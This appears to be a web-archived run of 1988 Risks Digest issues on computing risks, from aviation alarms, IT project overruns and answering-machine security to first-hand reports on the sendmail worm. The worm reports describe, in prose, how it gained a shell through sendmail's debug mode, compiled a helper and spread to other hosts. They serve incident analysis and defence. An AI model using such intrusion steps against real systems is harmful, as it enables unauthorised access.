The Delta crash led the aviation authority to order airlines in September
to check the alarm systems on nearly 1200 Boeing 727 aircraft.

The agency said yesterday tose checks resulted in "a significant number
of inoperative warning systems discovered" on the Boeing 727 aircraft.
It said that in 35 cases, the warning alarm either failed altogether or
operated improperly.

Although the September tests covered only Boeing 727s, the agency
concluded all Boeing 737 aircraft because their alarm systems are
"similar...and subject to similar fairlures."

[ Of course, even if the alarms do work properly, they must be ON to be
effective.  In the wake of the crashes in India on 19 October, there
have been several stories in the paper about other crashes where the
pilot turned off the alarms because they were annoying him, and then
neglected to put the landing gear down. ]

					Henry Cox

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.66.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.68.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-20</DOCNO>
<DOCOLDNO>IA012-000131-B034-376</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.68.html 128.240.150.127 19970217023520 text/html 21061
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:33:47 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 68</TITLE>
<LINK REL="Prev" HREF="/Risks/7.67.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.69.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.67.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.69.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 68</H1>
<H2> Monday 31 October 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Conspiracy to Defraud 
</A>
<DD>
<A HREF="#subj1.1">
Martyn Thomas
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  `Runaway' Computer Projects 
</A>
<DD>
<A HREF="#subj2.1">
Rodney Hoffman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Perceived risk 
</A>
<DD>
<A HREF="#subj3.1">
James F. Carter
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  "TCA pushes for privacy on corporate networks" 
</A>
<DD>
<A HREF="#subj4.1">
Jerry Leichter
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Risks in Answering Machines 
</A>
<DD>
<A HREF="#subj5.1">
Andy Glew
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Ear-itation 
</A>
<DD>
<A HREF="#subj6.1">
Ed Ravin
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Conspiracy to Defraud
</A>
</H3>
<address>
Martyn Thomas 
&lt;<A HREF="mailto:mct@praxis.UUCP">
mct@praxis.UUCP
</A>&gt;
</address>
<i>
Wed, 26 Oct 88 15:04:46 BST
</i><PRE>

The Confederation of British Industry has submitted a proposal to the Law
Commission proposing changes to the law on conspiracy to defraud.

They propose (inter alia) that current offences involving "deception"
(which require that a human mind is deceived) should be extended to include
deception of machines, including (in particular) computers.

This sounds risky - can anyone think of good examples of unintended
consequences?

Martyn Thomas				!uunet!mcvax!ukc!praxis!mct

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
`Runaway' Computer Projects
</A>
</H3>
<address>
Rodney Hoffman 
&lt;<A HREF="mailto:Hoffman.es@Xerox.COM">
Hoffman.es@Xerox.COM
</A>&gt;
</address>
<i>
30 Oct 88 13:20:56 PST (Sunday)
</i><PRE>

In the November 7, 1988 issue, 'Business Week' has a two-page story headlined
"IT'S LATE, COSTLY, INCOMPETENT -- BUT TRY FIRING A COMPUTER SYSTEM: Companies
get stuck with 'runaways' that trample all over their budgets and reputations."
Nothing amazingly new, but a good summary of the problems, with several case
histories.

From the article:  "A recent Peat Marwick Mitchell &amp; Co. survey of 600 of
the accounting firm's largest clients highlighted the problem:  Some 35%
currently have major runaways.... In 1986, [a management consultant] set up
a group at Peat Marwick to rein in runaways.  Since then, he has had $30
million in revenues from nearly 20 clients...."

Two sidebars are of interest:

            A SAMPLING OF `RUNAWAY' PROJECTS

  * ALLSTATE INSURANCE.  In 1982, with software from Electronic Data
    Systems, the insurer began to build an $8 million computer
    system that would automate it from top to bottom.  Completion
    date: 1987.  An assortment of problems developed, delaying
    completion until 1993.  The new estimated price: $100 million.
  * CITY OF RICHMOND.  In 1984 it hired Arthur Young to develop a
    $1.2 million billing and information sytem for its water and 
    gas utilities.  Completion date: March, 1987.  After paying
    out close to $1 million, Richmond recently canceled the contract,
    saying no system had been delivered.  Arthur Young has filed
    a $2 million breach of contract suit against the city.
  * BUSINESS MEN'S ASSURANCE.  In 1985 the reinsurer began a one-
    year project to build a $500,000 system to help minimize the 
    risk of buying insurance policies held by major insurers.  The
    company has spent nearly $2 million to date on the project, which
    is in disarray.  The new completion date is early 1990.
  * STATE OF OKLAHOMA.  In 1983 it hired a Big Eight accounting firm
    to design a $500,000 system to handle explosive growth in workers'
    compensation claims.  Two years and more than $2 million later, 
    the system still didn't exist.  It finally was finished last year
    at a price of nearly $4 million.
  * BLUE CROSS AND BLUE SHIELD UNITED OF WISCONSIN.  In late 1983 it
    hired Electronic Data Systems to build a $200 million computer
    sytem.  It was ready 18 months later -- on time.  But it didn't
    work.  The system spewed out some $60 million in overpayments
    and duplicate checks before it was harnessed last year.  By 
    then, Blue Cross says, it had lost 35,000 policyholders.
    
  [Several of these are discussed in more detail in the article.]

---

           HOW TO KEEP A PROJECT UNDER CONTROL
  
  * Before designing the system, get suggestions from the people
    who will use it.
  * Put senior, nontechnical management in charge of the project
    to help ensure that it is finished on time and within budget
  * Set up 12-month milestones -- interim deadlines for various 
    parts of the project
  * Insist on performance clauses that hold suppliers legally
    responsible for meeting deadlines
  * Don't try to update the system in midstream, before the original
    plan is finished

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Perceived risk
</A>
</H3>
<address>
&lt;<A HREF="mailto:jimc@math.ucla.edu">
jimc@math.ucla.edu
</A>&gt;
</address>
<i>
Wed, 26 Oct 88 16:22:19 PDT
</i><PRE>

Freudenburg, William R, "Perceived Risk, Real Risk: Social Science and the
Art of Probabilistic Risk Assessment", Science, vol 242 #4875 (10/7/88) p.44.
A very interesting article.  The author's thesis is that risks computed
from "hard scientific evidence" frequently inadequately predict both the 
probability and the consequences of a risk, because human factors are 
inadequately modelled.  Risk estimation workers suffer from non-obvious
human errors.  The general public are not as irrational as they sometimes
seem to technical people, when their concerns, values and experience 
history are taken into account.  

Readers of this newsgroup may already "know" all this, but it's useful
to have our noses rubbed in it yet again.

James F. Carter        (213) 825-2897
UCLA-Mathnet;  6608B MSA; 405 Hilgard Ave.; Los Angeles, CA  90024-1555

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
"TCA pushes for privacy on corporate networks"
</A>
</H3>
<address>
LEICHTER-JERRY@CS.YALE.EDU
&lt;<A HREF="mailto:"Jerry Leichter ">
"Jerry Leichter 
</A>&gt;
</address>
<i>
Wed, 19 Oct 88 14:54 EST
</i><PRE>

[Entered without permission from Computerworld, 3 Oct 88, page 133]

By Kathy Chin Leong, CW Staff

SAN DIEGO --- As more and more confidential data winds its way across computer
networks, users are expressing alarm over how much of that information is safe
from subsidiaries of the Bell operating companies and long-distance firms
providing transmission services.

This fear has prompted the Tele-Communications Association (TCA) and large
network users to appeal to the Federal Communications Commission to clarify
exactly what network data is available to these vendors.

Users with large networks, such as banks and insurance companies, are
concerned that published details even of where a circuit is routed can be
misused.  "We don't what someone like AT&amp;T to use our information and then
turn around and compete against us," said Leland Fong, a network planner at
Visa International in San Francisco.  Users are demanding that the FCC
establish a set of rules and regulations so that information is not abused.

At issue is the term "customer proprietary network information" (CPNI), which
encompasses packet data, address and circuit information and traffic
statistics on networks.  Under the FCC's Computer Inquiry III rules,
long-distance carriers and Bell operating companies --- specifically,
marketing personnel --- can get access to their own customers' CPNI unless
users request confidentiality.  What his group wants, TCA President Jerry
Appleby said, is the FCC to clarify exactly what falls under the category of
CPNI.

Fong added that users can be at the mercy of the Bell operating companies and
long-distance vendors if there are no safeguards established.  Customer
information such as calling patterns can be used by the operating companies
for thier own competitive advantage.  "At this time, there are no controls
over CPNI, and the users need to see some action on this," Fong said.

SPREAD THE CONCERN

At a meeting here during the TCA show, TCA officials and the association's
government liason committee met with AT&amp;T to discuss the issue; the group will
also voice its concerns to other vendors.

Appleby said the issue should not be of concern just to network managers but
to the entire company.  Earlier this month, several banks, including Chase
Manhattan Bank and Security Pacific National Bank, and credit card companies
met with the FCC to urge it to come up with a standard definition for CPNI,
Appleby said.

While the customer information is generally confidential, it is available to
the transmission carrier that is supplying the line.  The data is also
available to marketing departments of that vendor unless a company asks for
confidentiality.  Fong said that there is no regulation that prevents a
company from passing the data along to its subsidiaries.

[Comment:  What I find particularly fascinating about this article is its
perfect illustration of the world-view of large businesses.  Banks, insurance
companies and credit agencies collect tons of information about individuals,
which they then wish to treat as their private property, to do with as they
see fit.  They fight "government interference" intended to protect the privacy
of that data as expensive, burdensome and unnecessary.

But when their precious data is moved over AT&amp;T's lines, all of a sudden they
are very concerned that AT&amp;T not abuse it.  Not only that, but they want the
government to make SURE that AT&amp;T remains on its best behavior!
          	  				                 -- Jerry]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Risks in Answering Machines (revisited)
</A>
</H3>
<address>
Andy-Krazy-Glew
&lt;<A HREF="mailto:aglew%vger@xenurus.gould.com ">
aglew%vger@xenurus.gould.com 
</A>&gt;
</address>
<i>
Tue, 25 Oct 88 20:12:54 CDT
</i><PRE>

Recently I went to purchase an answering machine. Modern answering machines
have all sorts of remote features, features that can be exercised from another
phone, by generating touch tones. These features include the ability to listen
to already recorded messages, erase already recorded messages, change the
outgoing message that answers the phone, etc.
    There is almost no security for these remote features. The machine I bought
has a two digit code, with one digit factory set, and the second digit set by a
switch on the machine. The user settable digit can only be set to 3 values!
    Now, I don't have many secrets, so the idea of people listening to
my recorded messages doesn't bother me too much (except for the possibility
that a criminal watching my house and knowing my number could intercept
a message from me telling my wife that I won't be home for several hours).
    But I do not like the possibility that someone could, maliciously
or accidentally, erase messages, or change my answering message.
    And I most emphatically do not like the remote listen feature, whereby 
anyone can call my answering machine, press a dial tone, and listen to 
anything going on in my apartment.

I spent some time looking for a basic answering machine that had only the most
basic remote feature, the ability to listen to recorded messages remotely,
*without* having them erased. There doesn't seem to be such a system -- if you
can remotely listen, you can remotely erase.  Unfortunately, it does not seem
possible to selectively disable these remote features.
    Most salespeople were surprised by my concern, but one gave me the service
numbers for Panasonic and GE. The Panasonic service was distinctly unhelpful,
unable to understand why one might want more than the 256 password
possibilities in their top of the line model (a model that uses 3 digits, only
one of which is user settable).  The Panasonic service refused even to give me
an address to which I might write to describe what I think a secure answering
machine should be.  The GE service was much more sympathetic - but,
unfortunately, GE's consumer electronics was sold to Thomson a while back, and
the GE service didn't know where to forward consumer suggestions.

All this leads me to several questions:
    (1) Are there any answering machines that have redefinable passwords
    	that are long enough for an acceptable level of security?
    (2) Are there any answering machines that have only non-destructive
    	remote commands, ie. that only allow messages to be listened to remotely,
    	not reset and overwritten?
    (3) Have there been any incidents of remote sabotage of answering machines,
    	or, worse, criminal interception of messages, or bugging, as I describe
    	above?

Andy "Krazy" Glew, Motorola Microcomputer Division, Champaign-Urbana
Development Center  [lengthy trailer and disclaimer deleted.  PGN]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Ear-itation
</A>
</H3>
<address>
Ed Ravin
&lt;<A HREF="mailto:eravin@dasys1.UUCP ">
eravin@dasys1.UUCP 
</A>&gt;
</address>
<i>
24 Oct 88 15:10:19 GMT
</i><PRE>

I've got my own story to tell about high frequency noises crawling out of
computer related devices, and since I'm new to RISKS, my apologies if any
or all of this has been discussed before.

It all started back in college, when I went to a little office in the computing
center.  I walked into the room and immediately clapped my hands two my ears
and shouted in aversion to the awful sound I was hearing.  The two techs in the
room, who worked in there most of the day, looked at me like I was crazy,
because they didn't hear anything.  It turned out to be the high-frequency
whining from a Televideo terminal's flyback transformer.  The two technicians
never reported any ill effects from it.  The few times I visited them again I
had to stay outside of the office because of the direct pain I would experience
walking in there when that terminal was turned on.

After that I began noticing the sounds made by all the other CRT's in my
life.  They were high pitched and slightly irritating, but not painful.
I had always, even before meeting computers, noticed the 15khz whine from a
TV set, but it had never bothered me.

My next experience was with a DEC VT-100.  I visited a friend of mine who had
an operating VT-100 in a little room in his house.  Again, I heard a loud, high
pitched whine that I felt as pressure in my ears and pain.  He noticed nothing,
but said that that particular VT-100 was stacked with option boards and might
be overloading its power supply.  I've worked with other VT-100 terminals and
noticed noise, but not anywhere near as bad as that sample.

And the best story of all is the AT&amp;T Unix PC.  All of the Unix PC's I ever
worked with had a high-frequency noise problem to one extent or another, but
the worst offenders were the ones with 40 meg disk drives installed.  As soon
as I turned on of them on, I would hear a high pitched noise that would slowly
rise in pitch until it either went beyond my audible range or got lost in the
fan noise.  I thought nothing more of it until I realized that I was getting
headaches, stomachaches, and feeling irritable without knowing why.  I moved
the machine to a closet and used it remotely.  I polled everyone else at the
office, as well as a few visitors from AT&amp;T:  almost noone could hear the noise
from it, but anyone who had to work in the same room as the machine would
eventually start complaining, even if the machine was parked in a noisy machine
room.  This wasn't limited to one sample, because we returned the machine and
got it replaced two or three times, and none of them were acceptable to me.  It
wasn't just me, because we tried it out on a few other employees, who
complained of irritation, stomachaches and toothaches after being in the same
room as the Unix PC after a few days.  This noise was definitely associated
with the hard drive (as opposed to the flyback transformer who is the usual
culprit), and was in the 20khz or above range, since I couldn't directly hear
it, but felt it as a slight pressure in my ears.

I have walked up to airline reservation counters, car rental counters, and
other service desks where the ubiquitous VDT is part of the worker's routine,
where the worker must sit in front of the terminal all day, and blanched from
the whine coming out of the back of the CRT.  As a white collar employeee in a
technical office, with a moderately eloquent speaking ability, I was able to
explain to my managers why I couldn't use certain equipment and they understood
and assisted me.  The information industry service worker has no such options:
you can work on the machine or you can get another job.  Managers over 40
probably can't even hear at 15khz, and will not understand what you're talking
about.  There have been numerous studies of "cluster miscarriages", where a
high proportion of pregnant women using a particular brand of VDT all
experience miscarriages, but most studies of VDT hazards seem to focus on low
level radiation and ignore sound emissions completely.

There are no OSHA or NIOSH standards on high-frequency sound or ultrasound
emmissions from devices in the workplace: the engineers who build these things
are used to listening to 15 or 20 khz whines all day long and no longer notice
such things.  Maybe my problem is that I never listened to loud rock music and
my hearing above 15khz is mostly intact.  But even when you can't hear it, that
noise can still bother you, as witnessed by the Stevie Wonder experience (if
not my own).  And I wouldn't be surprised if it has a factor in miscarriages:
one of the things ultrasound can do is heat up the tissue under your skin,
which is related to the hospital uses of ultrasound devices.  The scary thing
is that so many people just dismiss this problem because they "can't hear it".

Ed Ravin                  | cucard!dasys1!eravin
(BigElectricCatPublicUNIX)| eravin@dasys1.UUCP  
Reader bears responsibility for all opinions expressed in this article.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.67.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.69.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-21</DOCNO>
<DOCOLDNO>IA012-000131-B034-401</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.69.html 128.240.150.127 19970217023603 text/html 23922
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:34:05 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 69</TITLE>
<LINK REL="Prev" HREF="/Risks/7.68.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.70.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.68.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.70.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 69</H1>
<H2> Thursday 3 November 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Virus on the Arpanet - Milnet 
</A>
<DD>
<A HREF="#subj1.1">
Cliff Stoll
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  More on the virus 
</A>
<DD>
<A HREF="#subj2.1">
Gene Spafford
</A><br>
<A HREF="#subj2.2">
 PGN
</A><br>
<A HREF="#subj2.3">
 Matt Bishop
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  A320 update 
</A>
<DD>
<A HREF="#subj3.1">
Robert Dorset via Steve Philipson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: Conspiracy to Defraud 
</A>
<DD>
<A HREF="#subj4.1">
Dan Franklin
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: Telephone answering machines 
</A>
<DD>
<A HREF="#subj5.1">
Vince Manis
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
 Virus on the Arpanet - Milnet
</A>
</H3>
<address>
&lt;<A HREF="mailto:Stoll@DOCKMASTER.ARPA">
Stoll@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Thu, 3 Nov 88 06:46 EST
</i><PRE>

Re Arpanet "Sendmail" Virus attack November 3, 1988

Hi Gang!

It's now 3:45 AM on Wednesday 3 November 1988.  I'm tired, so don't believe
everything that follows...

Apparently, there is a massive attack on Unix systems going on right now.

I have spoken to systems managers at several computers, on both the east
&amp; west coast, and I suspect this may be a system wide problem.

Symptom:  hundreds or thousands of jobs start running on a Unix system
bringing response to zero.

Systems attacked:  Unix systems, 4.3BSD unix &amp; variants (eg:  SUNs) any
sendmail compiled with debug has this problem.  See below.

This virus is spreading very quickly over the Milnet.  Within the past 4
hours, I have evidence that it has hit &gt;10 sites across the country,
both Arpanet and Milnet sites.  I suspect that well over 50 sites have
been hit.  Most of these are "major" sites and gateways.


Method:

Apparently, someone has written a program that uses a hole in SMTP
Sendmail utility.  This utility can send a message into another program.

Step 1:  from a distant Milnet host, a message is sent to Sendmail
       to fire up SED, (SED is an editor)  This is possible in certain
       versions of sendmail (see below).

2:  A 99 line C program is sent to SED through Sendmail.

3:  The distant computer sends a command to compile this C program.

4:  Several object files are copied into the Unix computer.
        There are 3 files:  one targeted to Sun
                            one targeted to SUN-3
                            one targeted to vax    (ultrix probably, not vms)

5:  The C program accepts as address other Milnet sites

6:  Apparently, program scans for other Milnet/arpanet addresses and
     repeats this process.



The bug in Sendmail:

When the Unix 4.3 BSD version of Sendmail is compiled with the Debug
option, there's a hole in it.

Most Unix systems (BSD 4.3 and Suns) apparently do not have this bug.
It exists only where the system manager recompiled Sendmail and enabled
debugging.


This is bad news.

  Cliff Stoll dockmaster.arpa

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
More on the virus
</A>
</H3>
<address>
Gene Spafford 
&lt;<A HREF="mailto:spaf@purdue.edu">
spaf@purdue.edu
</A>&gt;
</address>
<i>
Thu, 03 Nov 88 09:52:18 EST
</i><PRE>
Organization: SERC, Department of Computer Sciences, Purdue Univ.

All of our Vaxen and some of our Suns here were infected with the virus.  The
virus forks repeated copies of itself as it tries to spread itself, and the
load averages on the infected machines skyrocketed.  In fact, it got to the
point that some of the machines ran out of swap space and kernel table entries,
preventing login to even see what was going on!

The virus seems to consist of two parts.  I managed to grab the source code for
one part, but not the main component (the virus cleans up after itself so as
not to leave evidence).  The way that it works is as follows:

1) Virus running on an infected machine opens a TCP connection to a
victim machine's sendmail, invokes debug mode, and gets a shell.

2) The shell creates a file in /tmp named $$,l1.c (where the $$ gets replaced

by the current process id) and copies code for a "listener" or "helper"
program.  This is just a few dozen lines long and fairly generic code.  The
shell compiles this helper using the "cc" command local to the system.

3) The helper is invoked with arguments pointing back at the infecting
virus (giving hostid/socket/passwords as arguments).

4) The helper then connects to the "server" and copies a number of files
(presumably to /tmp).  After the files are copied, it exec's a shell with
standard input coming from the infecting virus program on the other end of the
socket.

From here, I speculate on what happens since I can't find the source to
this part lying around on our machines:

5) The newly exec'd shell attempts to compile itself from the files copied over
to the target machine.  I'm not sure what else the virus does, if anything --
it may also be attempting to add a bogus passwd file entry or do something to
the file system.  The helper program has an array of 20 filenames for the
"helper" to copy over, so there is room to spare.  There are two versions
copied -- a version for Vax BSD and a version for SunOS; the appropriate one is
compiled.

6) The new virus is dispatched.  This virus opens all the virus source
files, then unlinks the files so they can't be found (since it has them
open, however, it can still access the contents).  Next, the virus
steps through the hosts file (on the Sun, it uses YP to step through
the distributed hosts file) trying to connect to other machines'
sendmail.  If a connection succeeds, it forks a child process to infect
it, while the parent continues to attempt infection of other machines.

7) The child requests and initializes a new socket, then builds and invokes a
listener with the new socket number and hostid as arguments (#1, above).

The heavy load we see is the result of multiple viruses coming in from multiple
sites.  Since local hosts files tend to have entries for other local hosts, the
virus tends to infect local machines multiple times -- in some senses this is
lucky since it helps prevent the spread of the virus as the local machines slow
down.

The virus also "cleans" up after itself.  If you reboot an infected machine (or
it crashes), the /tmp directory is normally cleaned up on reboot.  The other
incriminating files were already deleted by the virus itself.

Clever, nasty, and definitely anti-social.  

--spaf

</PRE>
<HR><H3><A NAME="subj2.2">
More on the virus attack
</A>
</H3>
<address>
Peter Neumann 
&lt;<A HREF="mailto:neumann@csl.sri.com">
neumann@csl.sri.com
</A>&gt;
</address>
<i>
Thu, 3 Nov 1988 14:27:22 PDT
</i><PRE>

Remember that the above are preliminary messages relating to an event in
progress.  There seem to be many unanswered questions.  Perhaps someone will
contribute a definitive report to the next issue of RISKS.

Examination of the code suggests a fairly sophisticated person writing
relatively high quality (although undocumented) code, exploiting several flaws
that exist(ed) on many UNIX systems, and written with considerable good
practice in self-checking, reliability, etc.  From the evidence thus far, I
would guess it that this was a deliberate attack, not an accidental experiment
run astray. 

Although it was primarily a denial of service attack, it did some remarkable
things, taking advantage of many different approaches.  The spawned
processes appear to have been doing attacks on encrypted passwords to enable
ftps (in case the .rhost attack would not work -- cf. the Stanford breakins
described in CACM and SEN by Brian Reid).  Separate versions to run on Suns
and Vaxens were apparently propagated in DES encrypted form, decrypted, and
both programs tried to see which one would work.

We quoted Henry Petroski here over a year ago to the effect that we do not
learn from our successes, but that we have an opportunity to learn from our
failures.  Once again we are presented with the opportunity to learn that many
of our computer systems have serious security vulnerabilities, and that we need
to take pains to defend against the really malicious attacks.  Strangely some
people take heart in the fact that the security attacks to date (whether
penetrations, exploitations of privilege, Trojan horses, or legitimate viruses)
have been relatively modest in scale, perhaps to justify the absence of
concern.  I am afraid that it will take a Chernobyl- or Three-Mile-Island-like
disaster before the community at large wakes up.  PGN

</PRE>
<HR><H3><A NAME="subj2.3">
More on the virus
</A>
</H3>
<address>
Matt Bishop
&lt;<A HREF="mailto:bishop@bear.Dartmouth.EDU ">
bishop@bear.Dartmouth.EDU 
</A>&gt;
</address>
<i>
Thu, 3 Nov 88 16:32:25 EST
</i><PRE>

...  This program introduced itself through a bug in sendmail.  At these sites,
sendmail was compiled and installed with a debugging option turned on.  As near
as I can figure (I don't have access to the sendmail sources), by giving a
specific option to the "debug" command in sendmail (there are lots of those,
controlling what exactly you get information about) you can cause it to execute
a command.  As sendmail runs setuid to root, guess what privileges the command
is executed with.  Right.
   Apparently what the attacker did was this:  he or she connected to sendmail
(ie, telnet victim.machine 25), issued the appropriate debug command, and had
a small C program compiled.  (We have it.  Big deal.)  This program took
as an argument a host number, and copied two programs -- one ending in
q.vax.o and the other ending in .sun.o -- and tried to load and execute them.
In those cases where the load and execution succeeded, the worm did two things
(at least):  spawn a lot of shells that did nothing but clog the process table
and burn CPU cycles; look in two places -- the password file and the internet
services file -- for other sites it could connect to (this is hearsay, but I
don't doubt it for a minute.)  It used both individual .rhost files (which it
found using the password file), and any other remote hosts it could locate
which it had a chance of connecting to.  It may have done more; one of our
machines had a changed superuser password, but because of other factors we're
not sure this worm did it.
   This last part is still sketchy; I have the relevant sun.o file and will
take it apart to see just what it was supposed to do.  As of now, it appears
there was no serious damage (just wasted CPU cycles and system administrator
time).
   Two obvious points:
1.  Whoever did this picked only on suns and vaxen.  One site with a lot
    of IRISes and two Crays (ie, NASA Ames) got bit on their Suns and Vaxen,
    but the attempt to get the other machines didn't work.
2.  This shows the sorry state of software and security in the UNIX world.
    People should NEVER put a program with debugging hooks in it, especially
    when the hook is (or can be made) to execute an arbitrary command.  But
    that is how the sendmail which was used was distributed!
   One more interesting point:  initially, I thought an application of the
"principle of least privilege" would have prevented this penetration.  But
the attacker used a world-writeable directory to squirrel the relevant programs
in, so -- in effect -- everything could have been done by any user on the
system!  (Except the superuser password change, of course -- if this worm
did in fact do it.)
   I think the only way to prevent such an attack would have been to turn
off the deug option on sendmail; then the penetration would fail.  It goes to 
